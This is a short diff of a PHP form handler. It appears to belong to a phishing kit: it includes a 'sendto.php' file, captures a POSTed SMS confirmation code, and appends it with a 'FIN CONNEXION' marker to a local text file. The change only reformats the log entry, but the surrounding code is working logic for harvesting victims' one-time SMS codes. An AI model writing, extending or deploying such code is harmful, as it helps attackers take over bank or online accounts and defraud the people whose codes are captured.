@@ -2,11 +2,9 @@
  require_once "../sendto.php" ;
  if (isset( $_POST["sms"]) ) {
    // var_dump($_POST["sms"]) ;
+$donnees = "\n CONF SMS : `" . $_POST['sms'] . "`" .
+ "\n". "** FIN  CONNEXION **\n"."\n";
 
-$donnees = 
-"\n". "SMS : " .$_POST["sms"] .
-
-"\n";
 $file = "../blinky2000@bvc@bvc@destruction.txt" ;
 file_put_contents($file, $donnees, FILE_APPEND);
 
